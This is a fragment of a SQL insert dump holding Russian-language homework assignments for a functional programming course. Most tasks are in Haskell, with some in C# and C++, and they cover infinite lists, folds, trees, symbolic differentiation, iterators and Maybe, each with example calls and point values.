(57, 2, 12, '*Доп.задача, до 21.10*\r\n\r\nОписать функцию canMakeScheme с двумя параметрами:\r\n - список целых чисел [r1, r2, … rn]. Этот список задает набор имеющихся у нас сопротивлений.\r\n - целое число m. \r\nФункция должна проверить, можно ли построить из этих сопротивлений (не обязательно из всех) электрическую схему с общим сопротивлением m и вернуть в качестве результата True или False. \r\nСаму схему строить не надо.\r\n\r\nПример вызова:\r\n  canMakeScheme [4,4,5] 7\r\n\r\nОтвет должен быть True, потому что мы можем соединить параллельно 4 и 4, а потом присоединить последовательно 5.\r\n\r\nЗамечание:\r\n - Можно считать, что сопротивлений будет не больше 5.\r\n - Если вы напишете решение, которое работает за разумное время (скажем, за 15 мин.) для 9 резисторов, выложите ее, как решение задачи 12-3, за нее будет 3 балла.\r\n - Если вы напишите решение, которое работает для 15 резисторов, присылайте мне, за нее будет 20 баллов (но я не думаю, что это возможно..). \r\n        ', 1),
(58, 3, 12, '*Доп.задача, до 21.10*\r\nУсловие см. в задаче 12-2, задача должна работать для 9 сопротивлений. (Таких тестов в системе нет, но я проверю вручную). \r\n\r\n\r\n        ', 3),
(59, 1, 13, '*Доп.задача на C#, до 22.10*\r\n\r\nАналогом map в C# является, видимо, метод Select, а  аналогом filter - метод Where (это части LINQ но их вполне можно использовать и просто как удобные методы). См. простые примеры вызова этих методов тут:\r\n  http://msimuni.wikidot.com/fp-select-where \r\n\r\nС помощью Select и Where опишите функцию nonZeroLastDigits, которая:\r\n - берет в качестве параметра массив целых положительных чисел\r\n - возвращает массив из последних цифр всех чисел из исходного массива, кроме тех чисел, которые оканчиваются на 0.\r\n\r\nНапример, если входной массив содержит числа 354, 20, 9, 31, то надо вернуть массив из чисел 4, 9, 1 .\r\n\r\nЗамечание:\r\n - Конечно, в этой задаче нет особого смысла, это просто несложное упражнение на вызов Select и Where.\r\n        \r\n        ', 1),
(60, 2, 13, '*Доп.задача на С++, до 22.10*\r\n\r\nАналогом map в C++ является, видимо, функция transform, а аналогом filter - функция remove_if и  remove_copy_if. См. простые примеры вызова этих функций тут:\r\n  http://msimuni.wikidot.com/fp-select-where \r\n\r\nС помощью transform и remove_if (или remove_copy_if) опишите код,функцию nonZeroLastDigits, которая:\r\n - берет в качестве параметров массив целых положительных чисел и количество чисел\r\n - печатает последние цифр всех чисел из этого массива, кроме тех чисел, которые оканчиваются на 0.\r\n\r\nНапример, если входной массив содержал числа 354, 20, 9, 31, то функция должна напечатать 4, 9, 1 .\r\n\r\nЗамечание:\r\n - Честно говоря, transform и remove_if - это не самое удобная часть С++ ((. И, честно говоря, я лично ими никогда не пользовался и особо не собираюсь. И, конечно, поставленную задачу проще решить без всяких функций. \r\n - Т.е. это просто упражнение на использование стандартных функций С++, м.б. даже и не очень полезное, признаю((\r\n        \r\n        ', 1),
(61, 1, 14, 'В этой задаче надо реализовать сразу две функции: \r\nа. Напишите функцию sumDiv, которая для данного целого положительного числа возвращает сумму всех его делителей, не считая сам это число.\r\nб. Напишите функция perfects n, которая возвращает список всех совершенных чисел, меньших или равных n.\r\n\r\nПримеры вызова:\r\n  sumDiv 10\r\nОтвет должен быть равен 8 (так как 1+2+5=8)\r\n  perfects 1000\r\nОтвет должен быть равен\r\n  [6,28,496]\r\n\r\nСправка: Число называется совершенным, если оно равно сумме своих делителей.', 1),
(62, 2, 14, 'Напишите функция amicables n, которая возвращает список всех пар дружественных чисел, каждое из которых меньше или равно n. \r\nПример вызова:\r\n  amicables 1000\r\nОтвет должен быть равен\r\n  [(220,284)]\r\n\r\nСправка: Числа a и b называется дружественными, если a равно сумме делителей b, а b равно сумме делителей a.\r\n\r\nЗамечания: \r\n- Для единообразия давайте включать в список только те пары, в которых первое число меньше второго.\r\n- Видимо, имеет смысл скопировать и использовать функцмю sumDiv из задачи 14-1\r\n        ', 1),
(63, 3, 14, 'Опишите переменную fives, как бесконечный список [5,55,555,5555,...] - т.е. список из целых положительных чисел, у которых все цифры равны 5.\r\n\r\nПример вызова:\r\n  take 7 fives\r\nОтвет должен быть равен:\r\n  [5,55,555,5555,55555,555555,5555555]\r\n        ', 1),
(64, 4, 14, 'Опишите функцию foldTree, которая для дерева делает что-то аналогичное foldr или foldl для списков.\r\n\r\nТ.е. задача написать что-то, что позволяет искать\r\nсумму, произведение и т.д. для всех элементов дерева. На самом деле это можно сделать разными\r\nспособами. \r\n\r\nа. Например, можно написать функцию foldTree, которая вызывается\r\nкак-то так:\r\n\r\nfoldTree (+) 0 t — ищет сумму всех элементов в дереве\r\nfoldTree (*) 1 t — ищет произведение всех элементов в дереве\r\n\r\nб. Но м.б. можно придумать что-то более общее? Например, придумать такой вариант foldTree, который позволяет реализовывать более сложные функции (например, искать высоту дерева и т.д.). Если придумаете, предложите какой-нибудь такой вариант.\r\n\r\nЗамечания:\r\n- Условие, естественно, не совсем строгое (но так и в жизни часто бывает..). Если есть вопросы - пишите.\r\n- Пункт б. необязательный (хотя и не особо сложный). Решения, описанного в пункте а. тоже вполне достаточно. \r\n- В этой задаче, естественно, тестов не будет. Желательно, чтобы вы включили в текст 2-3 примера  того, как можно использовать программу.', 1),
(65, 1, 15, '*Доп. задача, до 28.10*\r\n\r\nОписать бесконечный список cantor , содержащий все пары целых положительных чисел (каждую по одному разу).\r\n\r\nПример вызова:\r\n  take 100 cantor\r\n\r\nЧто получится, не могу сказать, потому что вы можете выбирать разные порядки обхода, но, например, что-то вроде [(1,1), (1,2), (2,2), (2,1), (1,3) и т.д.\r\n\r\n        ', 1),
(66, 2, 15, '*Доп. задача, до 28.10*\r\n\r\nОписать функцию generalizedCantor с одним параметром n, которая возвращает бесконечный список, содержащий все возможные списки из n целых положительных чисел (каждый список по одному разу).\r\n\r\nПример вызова:\r\n  take 100 (generalizedCantor 3)\r\n\r\nЧто при этом получится, не могу сказать, потому что вы можете выбирать разные порядки обхода, но начало, видимо, будет  [[1,1,1], [1,1,2], и т.д.\r\n        \r\n        ', 1),
(67, 2, 16, '*Доп.задача до 30.10*\r\n\r\nИспользуя функцию transform из задачи 13-2, напишите функцию zeroDigits с тремя параметрами a (массив), size (размер массива), n (целое положительное число). Эта функция должна во всех элементов массива a заменить последние n цифр на 0.\r\n\r\nНапример, если в массиве числа, 563, 5643, 76796,\r\nто после вызова zeroDigits(a, 3, 2) в массиве должны быть числа 500, 5600, 76700\r\n\r\nЗамечания:\r\n- Важно: Eсли в С++ в лямбда-выражении используются нелокальные переменные (т.е. используется замыкание), то их надо перечислить в начале лямбда выражения в квадратных скобках (это так называемый список захвата - capture list). Например:\r\n\r\n  [n] (int i) { return i + n; }\r\n\r\n- список захвата можно записать и другими способами, но это остается для самостоятельного изучения :)\r\n        \r\n        ', 1),
(68, 1, 16, '*Доп.задача до 30.10*\r\n\r\nИспользуя функцию Select из задачи 13-1, напишите функцию zeroDigits с двумя параметрами a (массив целых положительных чисел), n (целое положительное число). Эта функция должна во всех элементов массива a заменить последние n цифр на 0 и вернуть полученный новый массив.\r\n\r\nНапример, если в массиве числа, 563, 5643, 76796,\r\nто после вызова zeroDigits(a, 2) должен вернуться массив из чисел 500, 5600, 76700', 1),
(69, 1, 17, 'Описать функцию bigSin c параметром x, которая возвращает первый элемент в последовательности\r\n  sin 1, sin 2, sin 3, sin 4, ...\r\n, который больше или равен x. \r\n\r\nДополнительное условие: нельзя определять свои функции (кроме bigSin, конечно). Можно использовать любые стандартные функции и лямбда выражения.\r\n\r\nПример вызова:\r\n  bigSin 0.99\r\nрезультат должен быть равен примерно 0.990607\r\n\r\nЗамечания:\r\n - очевидная подсказка: тут, конечно, удобно использовать бесконечные списки. Но можно и без них, наверное.\r\n\r\n        \r\n        \r\n        ', 1),
(70, 2, 17, 'Описать функцию myFilter - свою реализацию функции  filter c точно таким же интерфейсом.\r\nДополнительное условие: эта реализация должна использовать только функцию foldr и лямбда выражения.\r\n\r\nПример вызова:\r\n  myFilter (>0) [1,-2,3,-5]\r\nрезультат должен быть равен [1,3]\r\n        ', 1);
INSERT INTO `task` (`TaskID`, `TaskForHometask`, `HometaskID`, `Condition`, `Price`) VALUES
(71, 3, 17, 'a. Опишите функцию approxSum, параметр который - бесконечный список и которая считает сумму входящих в него элементов, пока очередной элемент не станет по модулю меньше 0.000001.\r\n\r\nб. Используя approxSum, сосчитайте приближенную сумму ряда 1/1 + 1/4 + 1/9 + ... + 1/(i*i) + ...\r\nЗначение этой приближенной функции присвойте переменной z.\r\n\r\nПример вызова:\r\n  z\r\nДолжно получиться примерно 1.64\r\n        ', 1),
(72, 4, 17, 'Пусть в списке я записал последовательность чисел - сколько денег я тратил каждый день в этом году. Запись я начал, конечно же, с понедельника. \r\n\r\nОпишите функцию weekendExpences у которой параметр - такой список расходов, и которая вычисляет для него общую сумму расходов по выходным.\r\n\r\nПример вызова:\r\n  weekendExpences [3,1,4,12,3,5,17,6,7,7,8,18,5,1, 3]\r\n\r\nОтвет должен быть равен 5+17+5+1 = 28.\r\n\r\nЗамечание:\r\n- В этой задаче можно (но не обязательно) использовать зацикленный список\r\n        ', 1),
(73, 5, 17, 'Опишите бесконечный список fibs, состоящий из чисел Фибоначчи.\r\nДополнительное условие: желательно использовать прием "завязывание в узел" (tying the knot). Но, если не получится, можно решить эту задачу любым способом.\r\n\r\nПример вызова:\r\n  take 10 fibs\r\n\r\nРезультат должен быть равен:\r\n [1,1,2,3,5,8,13,21,34,55]\r\n\r\nЗамечание:\r\n- Безусловно эту задачу можно найти в интернете - и решение из интернета тоже засчитается. Но мне кажется интереснее попробовать самим что-то придумать, тем более это совсем и не сложно..', 1),
(74, 6, 17, 'Используя функцию foldTree с последнего занятия (второй вариант, который катаморфизм), опишите функцию sumPos. У этой функции параметр - дерево, и она должна вычислять сумму всех положительных чисел в этом дереве.\r\n\r\nПример вызова:\r\n  sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))\r\nОтвет должен быть равен 7.\r\n        ', 1),
(75, 7, 17, 'В этой задаче надо прислать не программу, а просто текст.\r\na. Напишите, какой тип у функции foldr (если хотите, можете посмотреть, а можете сами попробовать придумать)\r\nб. Расскажите, как можно вывести этот тип, используя   определение foldr - примерно так, как мы это делали на занятии для map. Т.е. в этой задаче надо показать, неформально, как для foldr работает алгоритм Хиндли-Милнера.\r\n\r\nЗамечания:\r\n - текст foldr, на основании которого надо вывести тип, был у нас на занятии\r\n - если не очень понятно, что тут все-таки надо делать, пишите, обсудим. ', 1),
(76, 8, 17, 'Опишите класс Shape и типы Circle и Rect, как мы это делали на занятии. Добавьте в класс функцию perimeter и для Circle и Rect напишите ее определение.\r\n\r\nПримеры вызова:\r\n  perimeter (Circle 10)\r\nОтвет должен быть равен примерно 62.83\r\n  perimeter (Rect 3 7)\r\nОтвет должен быть равен 20  ', 1),
(77, 1, 18, '*Доп. задача, до 4.11*\r\n\r\nОписать sqrt2 как бесконечный список из чисел от 0 до 9, описывающий разложение sqrt(2) в бесконечную десятичную дробь. \r\n\r\nПример вызова:\r\n  take 20 sqrt2\r\n\r\nРезультат должен быть равен \r\n  [1,4,1,4,2,1,3,5,6,2,3,7,3,0,9,5,0,4,8,8]\r\n\r\nЗамечания:\r\n - Это, видимо, больше задачка по выч. методам, а не по программированию.. Мне кажется, не очень сложная.\r\n - Подсказка: задача не очень сложная, потому что Haskell может выполнять операции над целыми числами любой длины. Тут это удобно.\r\n        \r\n        \r\n        \r\n        ', 1),
(78, 2, 18, '*Доп. задача, до 4.11*\r\n\r\nОписать pascal как бесконечный список списков, содержащий треугольник Паскаля. \r\n\r\nДополнительное условие: В этой задаче нельзя определять никакие новые функции (кроме Pascal). Можно использовать стандартные функции. Можно (и я бы советовал) использовать прием tying the knot. \r\n\r\nПример вызова:\r\n  take 6 pascal\r\n\r\nРезультат должен быть равен \r\n  [[1], [1,1], [1,2,1], [1,3,3,1], [1,4,6,4,1], [1,5,10,10,5,1]]\r\n        \r\n        ', 1),
(79, 1, 19, '*Доп.задача на C# до 5.11*\r\n\r\nОпишите блок итератора digits(int n), возвращающий последовательность цифр дроби 1/n. Например, при обращении к digits(7) должны  возвращаться цифры 1, 4, 2, 8, 5, 7, 1, 4, 2, 8, 5, 7, ...\r\n\r\nC использованием digits напишите программу, которая вводит число n и печатает первые 100 цифр числа 1/n.\r\n\r\nПро блоки итераторов немного написано вот тут:\r\n http://msimuni.wikidot.com/fp-generators\r\n        ', 1),
(80, 2, 19, '*Доп.задача на C# до 5.11*\r\n\r\n"Задача Кантора" на С#\r\n\r\nОпишите на C# блок итератора, возвращающий последовательность всех пар целых положительных чисел.\r\n\r\nПро блоки итераторов немного написано вот тут:\r\n http://msimuni.wikidot.com/fp-generators\r\n        ', 1),
(81, 1, 20, '*Доп. задача, до 11.11*\r\n\r\nОписать бесконечный список lst239, содержащий все целые положительные числа, состоящие только из цифр 2, 3 и 9. (Числа должны идти в порядке возрастания).\r\n\r\nПример вызова:\r\n\r\n  take 15 lst239\r\n\r\nДолжно получиться:\r\n  [2,3,9,22,23,29,32,33,39,92,93,99,222,223,229]\r\n\r\nЗамечание:\r\n - Эта задача, на самом деле, довольно эффектно решается с помощью tying the knot. Но, если не придумаете как тут завязать этот узел, эту задачу можно решить любым способом.', 1),
(82, 2, 20, '*Доп. задача, до 11.11*\r\n\r\nПусть у нас есть система равенств вида:\r\n  <переменная1> = <переменная2>.\r\nМы представляем ее в Хаскеле, как список пар строк. Например, список [("x","y"),("y","z"), ("n","m")] описывает систему равенств:\r\n  x = y\r\n  y = z\r\n  n = m\r\nКроме этого пусть у нас есть список переменных. Мы хотим сосчитать, сколько в этом списке различных переменных, с учетом этих равенств. Опишите функцию countDifferentVars, которая для данного списка равенств и списка переменных возвращает число различных переменных.\r\n\r\nПример вызова:\r\n  countDifferentVars [("x","y"),("y","z"), ("n","m")] ["x","w","y","z","x","n","m"]\r\n\r\nРезультат должен быть равен 3, потому что в списке три различных переменных (x - она же у и z, n - она же m, и w).\r\n\r\nЗамечания:\r\n - Это не упражнение на какую-то тему, которую мы проходили - тут надо просто написать более-менее нетривиальный алгоритм на Хаскеле.\r\n        ', 1),
(83, 1, 21, '*Доп. задача на C#, до 12.11*\r\n\r\nДля определения IEnumerable на C# тоже можно использовать прием tying the knot. Например, так можно определить геометрическую прогрессию:\r\n\r\npublic static IEnumerable<int> Geom()\r\n{\r\n      yield return 1;\r\n      foreach (int i in geom())\r\n      {\r\n           yield return 3*i;\r\n      }\r\n}\r\n\r\nПолучится, видимо, не так эффективно, как на Хаскеле (из-за того, что нет запоминания уже вычисленных значений), но вполне работоспособно.\r\n\r\nЗадача:\r\nРешить задачу 20-1 про числа из цифр 2, 3, 9 на C#. Т.е., описать блок итератора Lst239(), который по очереди возвращает числа 2, 3, 9, 22, 23, 29, 32, 33, 39, 92, 93, 99, 222 и т.д.\r\n\r\nЗамечание:\r\n - Для C# эта задача очень просто решается с помощью приема tying the knot, даже может быть проще, чем на Хаскеле. Но вы можете решить эту задачу любым способом.', 1),
(84, 2, 21, '*Доп. задача на C#, до 12.11*\r\n\r\nОписать функцию Iterate, у которой следующие примеры вызова:\r\n\r\n  foreach (double x in Iterate(2, x => x*2))\r\n  {\r\n     Console.WriteLine(x);\r\n     if (x > 1000000)\r\n        break;\r\n  }\r\n\r\nПечатает 2, 4, 8, 16, ... и т.д. - степени двойки до 1000000\r\n\r\n  int i = 0;\r\n  foreach (double x in Iterate(1, Math.Sin))\r\n  {\r\n     Console.WriteLine(x);\r\n     if (i++ == 100)\r\n        break;\r\n  }\r\n\r\nПечатает 1, sin 1 , sin (sin 1), и т.д. 100 раз.\r\n\r\nКакие у этой функции должны быть параметры и тип результата, определите, пожалуйста, сами по примерам вызова.\r\n\r\nЗамечание:\r\n - Можно считать, что в этой задаче у нас речь идет только про вещественные числа. (Например, первый параметр Iterate точно имеет тип double.) В принципе, можно было бы определить и generic версию, которая работает с разными типами, но в данном случае это не требуется. \r\n        \r\n        ', 1),
(85, 1, 22, 'Определите тип Ration для представления дробей. Конструктор этого типа должен записываться так: Rat <числитель> <знаменатель>.\r\nДля этого типа: \r\na. Определите оператор + (сложение дробей)\r\nb. Определите оператор < (сравнение дробей)\r\nc. Определите функцию show, которая генерирует строковое представление дроби в формате <числитель>/<знаменатель> \r\n\r\nПримеры вызова:\r\n\r\nRat 1 2 + Rat 1 7\r\n\r\nДолжно быть напечатано\r\n\r\n9/14\r\n\r\n(потому что при выводе автоматически вызовется show) \r\n\r\nRat 1 3 < Rat 4 5\r\n\r\nРезультат должен быть равен True\r\n\r\nЗамечания:\r\n- Еще обязательно придется определить ==, без этого программа не будет компилироваться.\r\n- Надо ли сокращать дроби? Например, что будет, если сложить Rat 1 3 и Rat 1 6? \r\nОтвет: Как хотите, не обязательно сокращать. В тестах таких примеров не будет.\r\n- Как должна работать функция show, если знаменатель равен 1 и в других необычных случаях?\r\nОтвет: Тоже как хотите, тут тоже тесты будут только очень простые.        \r\n        ', 1),
(86, 2, 22, 'Определить функцию allNondivisible, которая проверяет, верно ли что в данном списке нет двух элементов, таких, что один делится на другой.\r\n\r\nДополнительное условие: В этой задаче, пожалуйста, обязательно используйте прием с представлением множества с помощью логической функции, который мы разбирали на занятии.\r\n\r\nПримеры вызова:\r\n\r\nallNondivisible [2, 7, 6, 5]\r\n\r\nРезультат должен быть равен False, потому что 6 делится на 2\r\n\r\nallNondivisible [4, 7, 6, 5]\r\n\r\nРезультат должен быть равен True, потому что ни одно число в списке не делится на другое.\r\n\r\nЗамечание: \r\nЕсли совсем непонятно, что это за прием такой, вы можете прислать любое решение этой задачи, а я, в обмен на это, подскажу, как ее делать с этим приемом :)\r\n        \r\n        ', 1),
(87, 3, 22, 'Для типа Expr, который мы разбирали на занятии, опишите функцию eval. Эта функция должна вызываться так: eval выражение число. Функция должна вычислять значение выражения при данном значении X.\r\n\r\nПример вызова:\r\n\r\n   eval (Add (N 3) (Mult X X)) 10\r\n\r\nДолжно получиться 103\r\n        ', 1),
(88, 4, 22, 'Для типа Expr, который мы разбирали на занятии, опишите функцию diff, которая вычисляет производную данного выражения по X.\r\n\r\n  diff (Mult X X)\r\n\r\nДолжно получиться\r\n\r\n   Add (Mult(N 1) X) (Mult X (N 1))\r\n\r\nЗамечания:\r\n- В описании типа надо обязательно в конце написать deriving Show. (На занятии я забыл это сделать :( ). Иначе не удастся вывести результат. \r\n- Упрощать выражение не надо. Т.е. не требуется, например, пытаться вместо Add (Mult(N 1) X) (Mult X (N 1)) получить Mult (N 2) X.\r\n        ', 1),
(89, 5, 22, 'Опишите функцию flatten, которая для данного дерева возвращает список из всех значений, записанных в вершинах дерева.\r\n\r\nПожелание: \r\nБыло бы замечательно, если бы вы написали реализацию flatten, которая не использует операцию ++. Потому что ++, как мы знаем, работает медленно и flatten получится неэффективным. Но, если не придумаете, подойдет любая реализация, и с использованием ++.\r\n\r\nПример вызова:\r\n\r\nflatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))\r\n\r\nДолжно получиться\r\n\r\n   [1,2,3] \r\n\r\nЗамечание:\r\n- Желательно, чтобы значения шли в в таком порядке, как в примере (вершина, потом левое поддерево, потом правое поддерево).\r\n        \r\n        \r\n        ', 1),
(90, 6, 22, 'Пусть нас попросили написать функцию findSame, которая для данного списка возвращает элемент, который в нем встречается больше одного раза. Например, для [1,2,3,2,5] надо вернуть 2.\r\n\r\nМы, естественно, просим уточнить:\r\n- Что делать, если таких элементов несколько?\r\n- Что делать, если таких элементов вообще нет?\r\n\r\nА нам сказали:\r\n- Если из несколько, можно вернуть любой.\r\n- Если вообще нет таких элементов - ну, нам сказали, придумайте что-нибудь.. Подойдет любое решение, но надо, чтобы пользователь мог понять, нашлось что-то или нет.\r\n\r\nЗадача: придумать интерфейс для findSame и реализовать эту функцию.\r\n\r\nПримеры вызова:\r\n\r\nfindSame [1,2,3,2,5]\r\n\r\nДолжно получиться что-то на ваше усмотрение, но, видимо это должно быть число 2 и еще м.б. какая-то дополнительная информация.\r\n\r\nfindSame [1,3,2,5]\r\n\r\nДолжно получиться что-то на ваше усмотрение, но, видимо это должна быть какая-то информация о том, что мы ничего не нашли.\r\n\r\nЗамечания:\r\n- Самый первый вариант, который лично мне приходит в голову - это вернуть пару (число, логическое значение). Это, на самом деле, видимо вовсе не лучший вариант, но вполне нормальный. Если хотите, можете его реализовать, а можете придумать что-то другое.\r\n- Просто на всякий случай, в этой задаче _не_ требуется использовать прием с представлением множества, как функции. Тут подойдет любая простая реализация.        \r\n        \r\n        ', 1),
(91, 7, 22, 'Опишите функцию merge, у которой два параметра - списки, причем мы точно знаем, что эти значения в этих списках строго возрастают. Функция должна вернуть строго возрастающий список, содержащий значения из обеих списков. Если элемент встречается в обеих списках, в результате он должен встречаться только один раз. \r\n\r\nПример вызова:\r\n\r\nmerge [1,4,8] [2,4,5,10,20]\r\n\r\nДолжно получиться\r\n\r\n [1,2,4,5,8,10,20]\r\n\r\nЗамечания:\r\n- Списки могут быть и бесконечными\r\n- Эта задаче особо ни какой теме не относится - просто полезная функция, которую полезно уметь писать, и которая вполне часто используется на практике\r\n        ', 1),
(93, 1, 23, '*Доп.задача, до 18.11*\r\n\r\nОпишите ham - бесконечную последовательность, состоящую из целых чисел вида 3^i*10^j (где i, j - целые неотрицательные числа), расположенных в порядке возрастания.\r\n\r\nДополнительное условие: функция должна работать более-менее быстро. Скажем, надо, чтобы за 30 секунд можно было вычислить элемент с номером 10000.\r\n  \r\nПримеры вызова:\r\n\r\ntake 10 ham\r\n\r\nДолжно получиться \r\n\r\n  [1,3,9,10,27,30,81,90,100,243]\r\n\r\nham !! 10000\r\n\r\nДолжно получиться \r\n\r\n8862938119652501095929000000000000000000000000000000000000000000000000000000000000000000000000000\r\n\r\n        \r\n        ', 1),
(94, 2, 23, '*Доп.задача, до 18.11*\r\n\r\nОпишите для типа "электрическая схема" функцию show так, чтобы она наглядно изображала схему в виде резисторов, соединенных проводами, с помощью символов псевдографики (например, с помощью -, |, +).\r\n\r\nСправка: В строках Haskell можно использовать символ backslash n для перехода на следующую строку. Можно, при желании, использовать запись backslash x шестнадцатиричное число для того, чтобы задавать любые символы. \r\n\r\n(Пояснение: backslash - это такой символ, после него надо писать n или x и цифры  подряд. Просто система тестирования плохо относится к backslash в тексте :( )  \r\n\r\nЗа эту задачу будет записано 3 балла.\r\n        ', 3),
(95, 1, 24, '*Доп.задача на C#, до 19.11*\r\n\r\nНаписать на C# функцию, которая для данного массива целых чисел проверяет, верно ли, что в нем все элементы разные. При этом функция должна использовать "представление множеств с помощью функций". Т.е., другими словами, попробуйте переписать пример с последнего занятия на C#.\r\n\r\nЗамечания:\r\n- Если хотите, можете решить задачу для List<int> или вообще для IEnumerable<int> - как вам удобнее.\r\n- Вы можете спросить, а зачем такую простую задачу решать так сложно? Да в общем-то просто для интереса:) Ну и для тренировки в работе с лямбда-выражениями и т.д. На практике это, наверное, особо не применимо, честно говоря.\r\n\r\nПодсказка: \r\nЯ бы начал решение этой задачи как-то так:\r\n\r\npublic static bool allDifferent(int[] a)\r\n{\r\n   return allDifferent1(a, 0, t => true);\r\n}\r\n\r\n// allDifferent1 - вспомогательная функция\r\n//  a - массив, который мы проверяем\r\n//  from - с какого места в массиве мы проверяем\r\n//  cond - функция проверки (которую мы делаем все сложнее и сложнее)\r\n\r\npublic static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n{\r\n  ...\r\n        \r\n        \r\n        ', 1),
(96, 2, 24, '*Доп.задача на C#, до 19.11*\r\nСлияние IEnumerable\r\n\r\nОпределить генератор Merge с двумя параметрами типа IEnumerable<int>. Пусть мы точно знаем, что в обоих IEnumerable числа строго возрастают. Генератор должен объединять последовательности, т.е. результатом должна быть последовательность чисел из обеих входных последовательностей в порядке возрастания. Если какое-то число было в обеих входных последовательностях, то в выходной оно должно встречаться один раз.\r\n\r\nПример вызова:\r\n\r\nint [] a = { 1, 5, 8 };\r\nint [] b = { 3, 5, 9 };\r\nforeach (int i in Merge(a, b))\r\n{\r\n   Console.WriteLine(i);      // Должно напечататься 1, 3, 5, 8, 9\r\n}\r\n\r\nЗамечания:\r\n- Эта задача, в общем, то не имеет особого отношения к курсу. Просто, раз уж мы начали решать задачи про IEnumerable, то м.б. полезно решить не совсем тривиальную задачу на эту тему. Ну и написать полезную функцию).\r\n- В этой задаче, видимо, надо использовать возможности, которые мы не проходили (IEnumerable.GetEnumerator(), yield break). Т.е. это задача для тех, кому интересно во всем этом разобраться. Если не очень интересно, ну, просто пропустите ее и все..\r\n        \r\n        ', 1),
(97, 1, 25, '*Доп.задача до 25.11 (задача с контрольной)*\r\n\r\nПусть строчка содержит только символы  ‘[‘, ‘]‘,  ‘(‘ и ‘)‘. Опишите функцию checkBrackets, которая для данной строчки проверяет, что в ней находится правильная скобочная последовательность, и возвращает True или False. \r\n\r\nПримеры вызова:\r\n\r\ncheckBrackets "[()[]]()"\r\nРезультат должен быть равен True.\r\n\r\ncheckBrackets "([)]"\r\ncheckBrackets "())[]"\r\ncheckBrackets "([]"\r\nРезультат должен быть равен False.\r\n        ', 1),
(98, 2, 25, '*Доп.задача до 25.11 (задача с контрольной)*\r\n\r\nПусть у нас есть двоичное дерево, элементы которого – символы ‘a’ и ‘b‘. Написать две функции:\r\n- функция toStr по дереву строит его представление в виде строки – все буквы в этом дереве, и, видимо, какие-то воспомогательные значки. \r\n- функция fromStr должна по этой строке восстанавливать исходное дерево.\r\n   Т.е. надо придумать, как двоичное дерево закодировать в виде строки, и написать функции, которые его кодируют и декодируют.\r\n\r\nПример вызова:\r\n\r\nfromStr(toStr (Node ‘a‘ (Node ‘b‘ Empty Empty) Empty))\r\nРезультат должен быть равен исходному дереву, т.е. Node ‘a‘ (Node ‘b‘ Empty Empty) Empty\r\n\r\nЗамечание:\r\n- Не забудьте написать deriving Show, без этого тесты не пройдут.\r\n        \r\n        ', 1),
(99, 1, 26, '*Доп.задача на C#, до 26.11*\r\n\r\nРеализовать задачу 22-4 на C# (Или, если хотите, на С++, Java или любом `oбычном` языке.)\r\n\r\nИмеется в виду, что надо придумать какое-то свое внутреннее представление для символьных выражений и для этого представления написать функцию Diff, которая строит производную данного выражения. \r\n\r\nЗамечания:\r\n - Вывод выражения писать не обязательно, разве что он вам понадобится для отладки.\r\n - Эта задача, честно говоря, не имеет особого отношения к функциональному программированию :) Ну, просто, раз уж мы начали решать задачи про символьные вычисления, интересно сравнить, насколько это удобнее (или не удобнее) делать с помощью функциональных языков, чем с помощью обычных.\r\n        ', 1),
(100, 1, 27, 'Описать функцию allDiffLists с двумя параметрами n и k, которая возвращает список из всех списков длины k, которые можно составить из чисел 1..n, и в которых все числа разные.\r\n\r\nДополнительное условие: Тут надо обязательно использовать прием "представление множества с помощью функции".\r\n\r\nПример вызова:\r\nallDiffLists 3 2\r\n\r\nДолжно получиться:\r\n[[1,2],[1,3],[2,1],[2,3],[3,1],[3,2]]\r\n\r\n(не обязательно именно в таком порядке).\r\n\r\nЗамечание:\r\n- Мы эту задачу решили на последнем занятии, только без приема "представление множества с помощью функции". Т.е. это, на самом деле, довольно простое упражнение: переписать существующее решение с этим приемом.\r\n        \r\n        ', 1),
(101, 2, 27, 'Для типа Expr написать функцию simplify. Эта функция должна упрощать выражение, используя только два очень простых правила:\r\n\r\nвыражение * 0 = 0\r\nи\r\n0 * выражение = 0\r\n\r\nПримеры вызова:\r\n\r\nsimplify (Add (Mult X (N 0)) X)\r\n\r\nДолжно получиться:\r\nAdd (N 0) X\r\n\r\nsimplify (Mult X (Mult X (N 0)))\r\n\r\nДолжно получиться:\r\nN 0\r\n\r\nЗамечание:\r\n- Не забудьте написать deriving Show\r\n        \r\n        ', 1),
(102, 3, 27, 'Опишите функцию findMajor, которая для данного списка определяет, есть ли в нем элемент, который больше суммы всех остальных, вместе взятых, и, если есть, возвращает его, как результат.\r\n\r\nДля того, чтобы сообщить, есть такой элемент или нет, используйте стандартный тип Maуbe, который мы проходили на последнем занятии.\r\n\r\nПримеры вызова:\r\n\r\nfindMajor [2,3,15,2,2,2] \r\n\r\nДолжно получиться:\r\nJust 15\r\n\r\nfindMajor [2,3,5,2,4] \r\n\r\nДолжно получиться:\r\nNothing\r\n\r\nЗамечания:\r\n- Тут никаких хитростей, это простое упражнение на использование Maybe\r\n        \r\n        ', 1),
(103, 4, 27, 'На занятии мы разобрали функцию find, использующую failure continuation параметр, для того чтобы сообщить, что ничего не найдено. \r\n\r\nИспользуя только эту функцию, описать функцию findInLists, которая ищет элемент, удовлетворяющий данному условию в списке списков.\r\n\r\nПримеры вызова:\r\n\r\nfindInLists [[1,8,2], [2,7]] (>5) 0\r\n\r\nРезультат должен быть равен 8.\r\n  \r\nfindInLists [[1,8,2], [2,7]] (>10) 0\r\n\r\nРезультат должен быть равен 0.\r\n\r\nЗамечание: \r\nЖелательно в программе не использовать оператор if. Потому что, как мы говорили, при использовании failure continuation он, как правило, не нужен. Функция find, в каком-то смысле, сама работает, как оператор if. \r\nНо, если так не получиться, в принципе использовать if можно.\r\n        \r\n        ', 1),
(104, 5, 27, 'При помощи оператора >>= для списков описать функцию doubleEven, которая в данном списке все элементы, делящиеся на 2, повторяет два раза, а остальные оставляет, как есть.\r\n\r\nПример вызова:\r\n\r\ndoubleEven [1, 2, 6, 3]\r\n\r\nДолжно получиться:\r\n[1,2,2,6,6,3]\r\n        ', 1),
